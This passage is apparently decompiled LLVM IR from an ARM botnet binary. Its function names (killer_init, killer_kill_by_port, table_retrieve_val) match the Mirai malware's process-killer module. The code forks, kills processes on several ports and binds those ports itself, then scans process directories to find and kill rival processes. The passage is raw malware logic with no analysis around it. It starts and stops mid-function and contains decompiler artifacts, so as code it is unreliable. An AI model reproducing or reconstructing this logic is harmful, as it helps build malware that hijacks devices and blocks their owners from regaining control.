  %v0_ce80 = load i32, i32* @sb, align 4
  %v1_ce84 = inttoptr i32 %v0_ce80 to i32*
  %v2_ce84 = call i32 @__GI_closedir(i32* %v1_ce84)
  %v0_ce88 = load i32, i32* @r5, align 4
  %v1_ce88 = urem i32 %v0_ce88, 256
  br label %dec_label_pc_ce8c

dec_label_pc_ce8c:                                ; preds = %dec_label_pc_cc4c, %dec_label_pc_ce80
  %storemerge = phi i32 [ %v1_ce88, %dec_label_pc_ce80 ], [ 0, %dec_label_pc_cc4c ]
  store i32 %storemerge, i32* @r4, align 4
  %v1_ce90 = call i32 @sleep(i32 1)
  %v1_ce98 = call i32 @table_lock_val(i32 15)
  %v1_cea0 = call i32 @table_lock_val(i32 16)
  %v1_cea8 = call i32 @table_lock_val(i32 17)
  br label %dec_label_pc_ceac

dec_label_pc_ceac:                                ; preds = %bb, %dec_label_pc_ceec, %dec_label_pc_ce8c
  %v0_ceac = load i32, i32* @r4, align 4
  store i32 %v3_c9a8, i32* @r4, align 4
  store i32 %v6_c9a8, i32* @r5, align 4
  store i32 %v9_c9a8, i32* @r6, align 4
  store i32 %v12_c9a8, i32* @r7, align 4
  store i32 %v15_c9a8, i32* @r8, align 4
  store i32 %v18_c9a8, i32* @sb, align 4
  store i32 %v21_c9a8, i32* @sl, align 4
  store i32 %v24_c9a8, i32* @fp, align 4
  store i32 %v27_c9a8, i32* @lr, align 4
  ret i32 %v0_ceac

dec_label_pc_cec0:                                ; preds = %dec_label_pc_cba0
  %v1_cec0 = add i32 %v0_cec0, 1
  %v7_cec4 = icmp eq i32 %v0_cec0, 0
  br i1 %v7_cec4, label %dec_label_pc_cecc, label %dec_label_pc_cba8

dec_label_pc_cecc:                                ; preds = %dec_label_pc_cec0
  %v1_cecc = add i32 %v0_cbb0, 3
  %v2_cecc = inttoptr i32 %v1_cecc to i8*
  %v3_cecc = load i8, i8* %v2_cecc, align 1
  %v7_ced0 = icmp eq i8 %v3_cecc, 65
  br i1 %v7_ced0, label %dec_label_pc_cee4, label %dec_label_pc_ced8

dec_label_pc_ced8:                                ; preds = %dec_label_pc_cecc, %dec_label_pc_cee4
  %v0_cbb882 = phi i32 [ %v0_cbb883, %dec_label_pc_cecc ], [ 1, %dec_label_pc_cee4 ]
  br label %dec_label_pc_cb80.backedge

dec_label_pc_cb80.backedge:                       ; preds = %dec_label_pc_ced8, %dec_label_pc_cbac
  %v0_cbb881 = phi i32 [ %v0_cbb882, %dec_label_pc_ced8 ], [ %v0_cbb883, %dec_label_pc_cbac ]
  %v0_cec073 = phi i32 [ %v1_cec0, %dec_label_pc_ced8 ], [ %v0_cbac, %dec_label_pc_cbac ]
  %v0_cba0.pr70 = phi i32 [ 0, %dec_label_pc_ced8 ], [ %v0_cba0.pr71, %dec_label_pc_cbac ]
  %v0_cb80 = add i32 %v0_cbb0, 1
  %v1_cb80 = add i32 %v0_cbb0, 3
  %v2_cb80 = inttoptr i32 %v1_cb80 to i8*
  %v3_cb80 = load i8, i8* %v2_cb80, align 1
  %v4_cb80 = zext i8 %v3_cb80 to i32
  store i32 %v4_cb80, i32* @r3, align 4
  %v2_cb84 = icmp eq i8 %v3_cb80, 0
  %v1_cb88 = add i32 %v0_cb8878, 1
  br i1 %v2_cb84, label %dec_label_pc_cbb8, label %dec_label_pc_cb90

dec_label_pc_cee4:                                ; preds = %dec_label_pc_cecc
  store i32 1, i32* @lr, align 4
  br label %dec_label_pc_ced8

dec_label_pc_ceec:                                ; preds = %dec_label_pc_cc30
  %v1_cef0 = call i32 @table_lock_val(i32 15)
  %v1_cef8 = call i32 @table_lock_val(i32 16)
  %v1_cf00 = call i32 @table_lock_val(i32 17)
  %v1_cf08 = call i32 @table_lock_val(i32 19)
  br label %dec_label_pc_ceac

dec_label_pc_cf10:                                ; preds = %entry
  store i8 48, i8* %stack_var_-72, align 1
  br label %dec_label_pc_ca54

; uselistorder directives
  uselistorder i32 %v1_cb88, { 1, 0 }
  uselistorder i32 %v4_cb80, { 1, 0 }
  uselistorder i32 %v0_cbb881, { 1, 0 }
  uselistorder i32 %v1_cec0, { 1, 0 }
  uselistorder i32 %v2_ce74, { 1, 0 }
  uselistorder i32 %v1_cbe4, { 1, 0 }
  uselistorder i32 %v0_cbf030, { 1, 0 }
  uselistorder i32 %v1_cc08, { 0, 3, 1, 2 }
  uselistorder i32 %v0_cbac, { 1, 0 }
  uselistorder i32 %v0_cb8878, { 1, 0 }
  uselistorder i32 %v0_cec0, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v0_cbb883, { 1, 2, 0 }
  uselistorder i32 %v1_cb8854, { 1, 0 }
  uselistorder i32 %v2_cb6c, { 1, 0 }
  uselistorder i32 %v1_cb68, { 3, 1, 0, 2, 4 }
  uselistorder i32 %v1_cb28, { 0, 2, 1 }
  uselistorder i32 %v0_cb2816, { 1, 0 }
  uselistorder i32 %v1_caf4, { 0, 2, 3, 4, 5, 6, 1 }
  uselistorder i32 %v3_ca84, { 1, 2, 0 }
  uselistorder i32 %v0_ca2c, { 1, 0 }
  uselistorder i32 %v2_ca28, { 1, 0, 2 }
  uselistorder i8* %v3_ca10, { 1, 0, 2 }
  uselistorder i32 %v2_c9f0, { 1, 2, 3, 0, 4, 5 }
  uselistorder i8* %stack_var_-585, { 1, 4, 0, 2, 3 }
  uselistorder i8* %stack_var_-72, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 0, 1, 2, 4, 3 }
  uselistorder i32 (i8*, i32, i32)* @util_fdgets, { 1, 0 }
  uselistorder label %dec_label_pc_ced8, { 1, 0 }
  uselistorder label %dec_label_pc_ceac, { 1, 2, 0 }
  uselistorder label %dec_label_pc_ce8c, { 1, 0 }
  uselistorder label %dec_label_pc_ce80, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_ce68, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_cd78, { 1, 0 }
  uselistorder label %dec_label_pc_cd78thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_cd60.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_cc7c, { 1, 0 }
  uselistorder label %dec_label_pc_cc7c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_cc6c.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cc04, { 2, 1, 0 }
  uselistorder label %dec_label_pc_cbac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_cb90, { 1, 0 }
  uselistorder label %dec_label_pc_cb34, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_ca98.backedge, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_cae8, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_cab0, { 1, 0 }
  uselistorder label %dec_label_pc_ca54, { 1, 0 }
}

define i32 @killer_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-4304 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-4312 = alloca i32, align 4
  %v3_cf3c = load i32, i32* @r4, align 4
  %v6_cf3c = load i32, i32* @r5, align 4
  %v9_cf3c = load i32, i32* @r6, align 4
  %v12_cf3c = load i32, i32* @r7, align 4
  %v15_cf3c = load i32, i32* @r8, align 4
  %v18_cf3c = load i32, i32* @sb, align 4
  %v21_cf3c = load i32, i32* @sl, align 4
  %v24_cf3c = load i32, i32* @fp, align 4
  %v27_cf3c = load i32, i32* @lr, align 4
  %v2_cf4c = call i32 @__GI_time(i32* null)
  store i32 %v2_cf4c, i32* @sl, align 4
  %v0_cf54 = call i32 @__libc_fork()
  %v7_cf58 = icmp eq i32 %v0_cf54, -1
  %. = zext i1 %v7_cf58 to i32
  %tmp122 = icmp slt i32 %v0_cf54, 1
  %storemerge94 = select i1 %tmp122, i32 %., i32 1
  store i32 %storemerge94, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_24a54.71 to i32), i32* %r3.global-to-local, align 4
  %v2_cf74 = icmp eq i32 %storemerge94, 0
  store i32 %v0_cf54, i32* @global_var_24a54.71, align 4
  br i1 %v2_cf74, label %dec_label_pc_cf90, label %dec_label_pc_cf80

dec_label_pc_cf80:                                ; preds = %dec_label_pc_d2bc, %dec_label_pc_d1bc, %entry
  %v1_cf8c = phi i32 [ %v3_d260, %dec_label_pc_d1bc ], [ %v0_cf54, %entry ], [ 0, %dec_label_pc_d2bc ]
  store i32 %v3_cf3c, i32* @r4, align 4
  store i32 %v6_cf3c, i32* @r5, align 4
  store i32 %v9_cf3c, i32* @r6, align 4
  store i32 %v12_cf3c, i32* @r7, align 4
  store i32 %v15_cf3c, i32* @r8, align 4
  store i32 %v18_cf3c, i32* @sb, align 4
  store i32 %v21_cf3c, i32* @sl, align 4
  store i32 %v24_cf3c, i32* @fp, align 4
  store i32 %v27_cf3c, i32* @lr, align 4
  ret i32 %v1_cf8c

dec_label_pc_cf90:                                ; preds = %entry
  %v2_cf90 = ptrtoint i32* %stack_var_-216 to i32
  store i32 %v2_cf90, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  %v1_cfa8 = call i32 @killer_kill_by_port(i32 add (i32 ptrtoint (i32* @global_var_e600.75 to i32), i32 -69))
  store i32 -6725, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_cfc0 = load i32, i32* @r5, align 4
  store i32 %v0_cfc0, i32* %r2.global-to-local, align 4
  %v3_cfc8 = call i32 @socket(i32 2, i32 1, i32 %v0_cfc0)
  %v7_cfcc = icmp eq i32 %v3_cfc8, -1
  store i32 %v3_cfc8, i32* @r4, align 4
  br i1 %v7_cfcc, label %dec_label_pc_cff4, label %dec_label_pc_cfd8

dec_label_pc_cfd8:                                ; preds = %dec_label_pc_cf90
  %v2_cfdc = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_cfdc, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_cfe4 = call i32 @bind(i32 %v3_cfc8, i32 %v2_cfdc, i32 16)
  %v0_cfe8 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_cff0 = call i32 @listen(i32 %v0_cfe8, i32 1)
  br label %dec_label_pc_cff4

dec_label_pc_cff4:                                ; preds = %dec_label_pc_cf90, %dec_label_pc_cfd8
  %v2_cffc = call i32 @killer_kill_by_port(i32 ptrtoint ([3 x i8]* @global_var_c707.76 to i32))
  store i32 -14585, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_d014 = load i32, i32* @r5, align 4
  store i32 %v0_d014, i32* %r2.global-to-local, align 4
  %v3_d01c = call i32 @socket(i32 2, i32 1, i32 %v0_d014)
  %v7_d020 = icmp eq i32 %v3_d01c, -1
  store i32 %v3_d01c, i32* %r4.global-to-local, align 4
  br i1 %v7_d020, label %dec_label_pc_d048, label %dec_label_pc_d02c

dec_label_pc_d02c:                                ; preds = %dec_label_pc_cff4
  %v2_d030 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_d030, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d038 = call i32 @bind(i32 %v3_d01c, i32 %v2_d030, i32 16)
  %v0_d03c = load i32, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d044 = call i32 @listen(i32 %v0_d03c, i32 1)
  br label %dec_label_pc_d048

dec_label_pc_d048:                                ; preds = %dec_label_pc_cff4, %dec_label_pc_d02c
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_d050 = load i32, i32* @r5, align 4
  store i32 %v0_d050, i32* %r2.global-to-local, align 4
  %v3_d054 = call i32 @socket(i32 2, i32 1, i32 %v0_d050)
  %v7_d058 = icmp eq i32 %v3_d054, -1
  store i32 %v3_d054, i32* @r4, align 4
  br i1 %v7_d058, label %dec_label_pc_d080, label %dec_label_pc_d064

dec_label_pc_d064:                                ; preds = %dec_label_pc_d048
  %v2_d068 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_d068, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d070 = call i32 @bind(i32 %v3_d054, i32 %v2_d068, i32 16)
  %v0_d074 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d07c = call i32 @listen(i32 %v0_d074, i32 1)
  br label %dec_label_pc_d080

dec_label_pc_d080:                                ; preds = %dec_label_pc_d048, %dec_label_pc_d064
  %v1_d084 = call i32 @killer_kill_by_port(i32 5632)
  store i32 %v2_cf90, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_d098 = load i32, i32* @r5, align 4
  store i32 %v0_d098, i32* %r2.global-to-local, align 4
  %v3_d0a0 = call i32 @socket(i32 2, i32 1, i32 %v0_d098)
  %v7_d0a4 = icmp eq i32 %v3_d0a0, -1
  store i32 %v3_d0a0, i32* @r4, align 4
  br i1 %v7_d0a4, label %dec_label_pc_d0cc, label %dec_label_pc_d0b0

dec_label_pc_d0b0:                                ; preds = %dec_label_pc_d080
  %v2_d0b4 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_d0b4, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d0bc = call i32 @bind(i32 %v3_d0a0, i32 %v2_d0b4, i32 16)
  %v0_d0c0 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d0c8 = call i32 @listen(i32 %v0_d0c0, i32 1)
  br label %dec_label_pc_d0cc

dec_label_pc_d0cc:                                ; preds = %dec_label_pc_d080, %dec_label_pc_d0b0
  %v1_d0d0 = call i32 @killer_kill_by_port(i32 5888)
  store i32 %v2_cf90, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_d0e4 = load i32, i32* @r5, align 4
  store i32 %v0_d0e4, i32* %r2.global-to-local, align 4
  %v3_d0ec = call i32 @socket(i32 2, i32 1, i32 %v0_d0e4)
  %v7_d0f0 = icmp eq i32 %v3_d0ec, -1
  store i32 %v3_d0ec, i32* %r4.global-to-local, align 4
  br i1 %v7_d0f0, label %dec_label_pc_d118, label %dec_label_pc_d0fc

dec_label_pc_d0fc:                                ; preds = %dec_label_pc_d0cc
  %v2_d100 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_d100, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d108 = call i32 @bind(i32 %v3_d0ec, i32 %v2_d100, i32 16)
  %v0_d10c = load i32, i32* %r4.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d114 = call i32 @listen(i32 %v0_d10c, i32 1)
  br label %dec_label_pc_d118

dec_label_pc_d118:                                ; preds = %dec_label_pc_d0cc, %dec_label_pc_d0fc
  store i32 14597, i32* @r4, align 4
  %v1_d124 = call i32 @killer_kill_by_port(i32 14597)
  store i32 %v2_cf90, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_d138 = load i32, i32* @r5, align 4
  store i32 %v0_d138, i32* %r2.global-to-local, align 4
  %v3_d13c = call i32 @socket(i32 2, i32 1, i32 %v0_d138)
  %v7_d140 = icmp eq i32 %v3_d13c, -1
  store i32 %v3_d13c, i32* @r4, align 4
  br i1 %v7_d140, label %dec_label_pc_d168, label %dec_label_pc_d14c

dec_label_pc_d14c:                                ; preds = %dec_label_pc_d118
  %v2_d150 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_d150, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d158 = call i32 @bind(i32 %v3_d13c, i32 %v2_d150, i32 16)
  %v0_d15c = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d164 = call i32 @listen(i32 %v0_d15c, i32 1)
  br label %dec_label_pc_d168

dec_label_pc_d168:                                ; preds = %dec_label_pc_d118, %dec_label_pc_d14c
  %v1_d170 = call i32 @killer_kill_by_port(i32 add (i32 ptrtoint (i32* @global_var_c100.77 to i32), i32 3))
  store i32 -16125, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_d188 = load i32, i32* @r5, align 4
  store i32 %v0_d188, i32* %r2.global-to-local, align 4
  %v3_d190 = call i32 @socket(i32 2, i32 1, i32 %v0_d188)
  %v7_d194 = icmp eq i32 %v3_d190, -1
  store i32 %v3_d190, i32* @r4, align 4
  br i1 %v7_d194, label %dec_label_pc_d1bc, label %dec_label_pc_d1a0

dec_label_pc_d1a0:                                ; preds = %dec_label_pc_d168
  %v2_d1a4 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_d1a4, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_d1ac = call i32 @bind(i32 %v3_d190, i32 %v2_d1a4, i32 16)
  %v0_d1b0 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d1b8 = call i32 @listen(i32 %v0_d1b0, i32 1)
  br label %dec_label_pc_d1bc

dec_label_pc_d1bc:                                ; preds = %dec_label_pc_d168, %dec_label_pc_d1a0
  %v1_d1c0 = call i32 @sleep(i32 5)
  store i32 4096, i32* @r0, align 4
  %v0_d1c8 = call i32 @malloc()
  store i32 ptrtoint (i32* @global_var_24a50.79 to i32), i32* @r8, align 4
  store i32 ptrtoint (i32* @global_var_21f34.81 to i32), i32* %r3.global-to-local, align 4
  store i32 %v0_d1c8, i32* %r2.global-to-local, align 4
  %v0_d1d8 = load i32, i32* @r5, align 4
  %v1_d1d8 = trunc i32 %v0_d1d8 to i8
  %v3_d1d8 = inttoptr i32 %v0_d1c8 to i8*
  store i8 %v1_d1d8, i8* %v3_d1d8, align 1
  %v0_d1e0 = load i32, i32* @r5, align 4
  %v1_d1e0 = load i32, i32* %r3.global-to-local, align 4
  %v2_d1e0 = inttoptr i32 %v1_d1e0 to i32*
  store i32 %v0_d1e0, i32* %v2_d1e0, align 4
  %v0_d1e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_d1e4 = load i32, i32* @r8, align 4
  %v2_d1e4 = inttoptr i32 %v1_d1e4 to i32*
  store i32 %v0_d1e4, i32* %v2_d1e4, align 4
  %v1_d1e8 = call i32 @table_unlock_val(i32 15)
  %v1_d1f0 = call i32 @table_unlock_val(i32 16)
  %v0_d1f4 = load i32, i32* @r5, align 4
  store i32 %v0_d1f4, i32* %r1.global-to-local, align 4
  %v2_d1fc = inttoptr i32 %v0_d1f4 to i32*
  %v3_d1fc = call i32 @table_retrieve_val(i32 15, i32* %v2_d1fc)
  %v2_d204 = ptrtoint i32* %stack_var_-4304 to i32
  store i32 %v2_d204, i32* @r7, align 4
  store i32 %v3_d1fc, i32* %r1.global-to-local, align 4
  store i32 %v2_d204, i32* @r0, align 4
  %v2_d210 = bitcast i32* %stack_var_-4304 to i8*
  %v3_d210 = call i32 @util_strcpy(i8* %v2_d210, i32 %v3_d1fc)
  %v1_d214 = load i32, i32* @r7, align 4
  %v2_d214 = add i32 %v1_d214, %v3_d210
  store i32 %v2_d214, i32* @r4, align 4
  %v1_d218 = call i32 @__getpid(i32 %v3_d210)
  %v2_d220 = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_d220, i32* %r2.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v3_d228 = trunc i32 %v1_d218 to i8
  %v4_d228 = call i32 @util_itoa(i8 %v3_d228, i32 10, i32 %v2_d220)
  store i32 %v4_d228, i32* %r1.global-to-local, align 4
  %v0_d230 = load i32, i32* @r4, align 4
  store i32 %v0_d230, i32* @r0, align 4
  %v2_d234 = inttoptr i32 %v0_d230 to i8*
  %v3_d234 = call i32 @util_strcpy(i8* %v2_d234, i32 %v4_d228)
  %v0_d238 = load i32, i32* @r5, align 4
  store i32 %v0_d238, i32* %r1.global-to-local, align 4
  %v1_d23c = load i32, i32* @r4, align 4
  %v2_d23c = add i32 %v1_d23c, %v3_d234
  store i32 %v2_d23c, i32* @r4, align 4
  %v2_d244 = inttoptr i32 %v0_d238 to i32*
  %v3_d244 = call i32 @table_retrieve_val(i32 16, i32* %v2_d244)
  store i32 %v3_d244, i32* %r1.global-to-local, align 4
  %v0_d24c = load i32, i32* @r4, align 4
  store i32 %v0_d24c, i32* @r0, align 4
  %v2_d250 = inttoptr i32 %v0_d24c to i8*
  %v3_d250 = call i32 @util_strcpy(i8* %v2_d250, i32 %v3_d244)
  %v0_d254 = load i32, i32* @r5, align 4
  store i32 %v0_d254, i32* %r1.global-to-local, align 4
  store i32 %v3_d250, i32* @r6, align 4
  %v2_d260 = inttoptr i32 %v0_d254 to i32*
  %v3_d260 = call i32 @__libc_open(i32 %v2_d204, i32* %v2_d260)
  %v7_d264 = icmp eq i32 %v3_d260, -1
  br i1 %v7_d264, label %dec_label_pc_cf80, label %dec_label_pc_d26c

dec_label_pc_d26c:                                ; preds = %dec_label_pc_d1bc
  %v1_d26c = call i32 @__GI___libc_close(i32 %v3_d260)
  %v1_d274 = call i32 @table_lock_val(i32 15)
  %v1_d27c = call i32 @table_lock_val(i32 16)
  store i32 4095, i32* %r2.global-to-local, align 4
  %v2_d288 = load i32, i32* @global_var_24a50.79, align 4
  store i32 %v2_d288, i32* %r1.global-to-local, align 4
  %v3_d290 = call i32 @readlink(i32 %v2_d204, i32 %v2_d288, i32 4095)
  %v7_d294 = icmp eq i32 %v3_d290, -1
  br i1 %v7_d294, label %.thread7, label %bb125

.thread7:                                         ; preds = %dec_label_pc_d26c
  %v0_d29c8 = load i32, i32* @r6, align 4
  %v1_d29c9 = load i32, i32* @r4, align 4
  %v2_d29c10 = add i32 %v1_d29c9, %v0_d29c8
  store i32 %v2_d29c10, i32* %r1.global-to-local, align 4
  br label %bb126

bb125:                                            ; preds = %dec_label_pc_d26c
  %v3_d298 = load i32, i32* @global_var_24a50.79, align 4
  store i32 %v3_d298, i32* %r3.global-to-local, align 4
  %v0_d29c = load i32, i32* @r6, align 4
  %v1_d29c = load i32, i32* @r4, align 4
  %v2_d29c = add i32 %v1_d29c, %v0_d29c
  store i32 %v2_d29c, i32* %r1.global-to-local, align 4
  %v1_d2a0 = load i32, i32* @r5, align 4
  %v2_d2a0 = trunc i32 %v1_d2a0 to i8
  %v5_d2a0 = add i32 %v3_d298, %v3_d290
  %v6_d2a0 = inttoptr i32 %v5_d2a0 to i8*
  store i8 %v2_d2a0, i8* %v6_d2a0, align 1
  %v1_d2a4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb126

bb126:                                            ; preds = %.thread7, %bb125
  %v1_d2a4 = phi i32 [ %v2_d29c10, %.thread7 ], [ %v1_d2a4.pre, %bb125 ]
  %v0_d2a4 = load i32, i32* @r7, align 4
  %v2_d2a4 = sub i32 %v1_d2a4, %v0_d2a4
  store i32 %v2_d2a4, i32* @r1, align 4
  store i32 %v2_d204, i32* @r0, align 4
  %v0_d2ac = call i32 @util_zero()
  %v0_d2b0 = load i32, i32* @sl, align 4
  store i32 %v0_d2b0, i32* @r4, align 4
  %v0_d2b4 = load i32, i32* @r5, align 4
  store i32 400, i32* @r5, align 4
  %v2_d3bc = ptrtoint i32* %stack_var_-144 to i32
  %v2_d3c8 = bitcast i32* %stack_var_-144 to i8*
  %v2_d40c = ptrtoint i32* %stack_var_-208 to i32
  %v2_d410 = bitcast i32* %stack_var_-208 to i8*
  %v2_d484 = ptrtoint i32* %stack_var_-44 to i32
  %v2_d498 = ptrtoint i32* %stack_var_-48 to i32
  br label %dec_label_pc_d2bc

dec_label_pc_d2bc:                                ; preds = %dec_label_pc_d384, %bb126
  %stack_var_-4308.0 = phi i32 [ %v0_d2b4, %bb126 ], [ %stack_var_-4308.3, %dec_label_pc_d384 ]
  %v1_d2c0 = call i32 @table_unlock_val(i32 15)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d2cc = call i32 @table_retrieve_val(i32 15, i32* null)
  %v1_d2d0 = call i32 @__GI_opendir(i32 %v3_d2cc)
  store i32 %v1_d2d0, i32* @sb, align 4
  %v2_d2d4 = icmp eq i32 %v1_d2d0, 0
  br i1 %v2_d2d4, label %dec_label_pc_cf80, label %dec_label_pc_d2dc

dec_label_pc_d2dc:                                ; preds = %dec_label_pc_d2bc
  %v1_d2e0 = call i32 @table_lock_val(i32 15)
  %v0_d2e458 = load i32, i32* @sb, align 4
  %v1_d2e859 = inttoptr i32 %v0_d2e458 to i32*
  %v2_d2e860 = call i32 @__GI_readdir(i32* %v1_d2e859)
  %v2_d2ec62 = icmp eq i32 %v2_d2e860, 0
  br i1 %v2_d2ec62, label %dec_label_pc_d384, label %dec_label_pc_d2f4.preheader

dec_label_pc_d2f4.preheader:                      ; preds = %dec_label_pc_d2dc, %dec_label_pc_d2e4.backedge
  %v0_d2f471 = phi i32 [ %v2_d2e8, %dec_label_pc_d2e4.backedge ], [ %v2_d2e860, %dec_label_pc_d2dc ]
  %stack_var_-4308.163 = phi i32 [ %stack_var_-4308.1.be, %dec_label_pc_d2e4.backedge ], [ %stack_var_-4308.0, %dec_label_pc_d2dc ]
  br label %dec_label_pc_d2f4

dec_label_pc_d2f4:                                ; preds = %dec_label_pc_d2f4.preheader, %dec_label_pc_d36c
  %v0_d304 = phi i32 [ %v2_d378, %dec_label_pc_d36c ], [ %v0_d2f471, %dec_label_pc_d2f4.preheader ]
  %stack_var_-4308.2 = phi i32 [ %v1_d31c, %dec_label_pc_d36c ], [ %stack_var_-4308.163, %dec_label_pc_d2f4.preheader ]
  %v1_d2f4 = add i32 %v0_d304, 11
  %v2_d2f4 = inttoptr i32 %v1_d2f4 to i8*
  %v3_d2f4 = load i8, i8* %v2_d2f4, align 1
  %v4_d2f4 = zext i8 %v3_d2f4 to i32
  %v1_d2f8 = add nsw i32 %v4_d2f4, -48
  store i32 %v1_d2f8, i32* %r3.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_d2f8, 9
  br i1 %tmp, label %dec_label_pc_d2e4.backedge, label %dec_label_pc_d304

dec_label_pc_d304:                                ; preds = %dec_label_pc_d2f4
  store i32 %v1_d2f4, i32* @r6, align 4
  store i32 %v1_d2f4, i32* @r0, align 4
  %v1_d30c = call i32 @atol(i32 %v1_d2f4)
  store i32 %v1_d30c, i32* @sl, align 4
  %v0_d314 = load i32, i32* @r5, align 4
  %v1_d31c = add i32 %stack_var_-4308.2, 1
  %v5_d324 = icmp slt i32 %v0_d314, %v1_d30c
  %v2_d394 = call i32 @__GI_time(i32* null)
  br i1 %v5_d324, label %dec_label_pc_d390, label %dec_label_pc_d328

dec_label_pc_d328:                                ; preds = %dec_label_pc_d304
  %v0_d330 = load i32, i32* @r4, align 4
  %v2_d330 = sub i32 %v2_d394, %v0_d330
  %v7_d338 = icmp slt i32 %v2_d330, 601
  br i1 %v7_d338, label %dec_label_pc_d340, label %.thread11

.thread11:                                        ; preds = %dec_label_pc_d328
  store i32 400, i32* @r5, align 4
  br label %dec_label_pc_d2e4.backedge

dec_label_pc_d340:                                ; preds = %dec_label_pc_d328
  %v0_d340 = load i32, i32* @sl, align 4
  %v7_d344 = icmp slt i32 %v0_d340, 401
  br i1 %v7_d344, label %dec_label_pc_d2e4.backedge, label %dec_label_pc_d348

dec_label_pc_d348:                                ; preds = %dec_label_pc_d340
  store i32 %v1_d31c, i32* %r1.global-to-local, align 4
  %v3_d350 = zext i32 %v1_d31c to i64
  %v4_d350 = mul nuw i64 %v3_d350, 3435973837
  %v3_d3541 = udiv i64 %v4_d350, 34359738368
  %v3_d3583 = mul nuw nsw i64 %v3_d3541, 8
  %v3_d358 = trunc i64 %v3_d3583 to i32
  store i32 %v3_d358, i32* %r3.global-to-local, align 4
  %v2_d35c5 = mul nuw nsw i64 %v3_d3541, 2
  %v2_d35c = trunc i64 %v2_d35c5 to i32
  %v2_d360 = add i32 %v3_d358, %v2_d35c
  store i32 %v2_d360, i32* %r2.global-to-local, align 4
  %v9_d364 = icmp eq i32 %v1_d31c, %v2_d360
  br i1 %v9_d364, label %dec_label_pc_d36c, label %dec_label_pc_d2e4.backedge

dec_label_pc_d36c:                                ; preds = %dec_label_pc_d348
  %v1_d370 = call i32 @sleep(i32 1)
  %v0_d374 = load i32, i32* @sb, align 4
  %v1_d378 = inttoptr i32 %v0_d374 to i32*
  %v2_d378 = call i32 @__GI_readdir(i32* %v1_d378)
  %v2_d37c = icmp eq i32 %v2_d378, 0
  br i1 %v2_d37c, label %dec_label_pc_d384, label %dec_label_pc_d2f4

dec_label_pc_d384:                                ; preds = %dec_label_pc_d2e4.backedge, %dec_label_pc_d36c, %dec_label_pc_d2dc
  %stack_var_-4308.3 = phi i32 [ %stack_var_-4308.0, %dec_label_pc_d2dc ], [ %v1_d31c, %dec_label_pc_d36c ], [ %stack_var_-4308.1.be, %dec_label_pc_d2e4.backedge ]
  %v0_d384 = load i32, i32* @sb, align 4
  %v1_d388 = inttoptr i32 %v0_d384 to i32*
  %v2_d388 = call i32 @__GI_closedir(i32* %v1_d388)
  br label %dec_label_pc_d2bc

dec_label_pc_d390:                                ; preds = %dec_label_pc_d304
  store i32 %v2_d394, i32* %stack_var_-4312, align 4
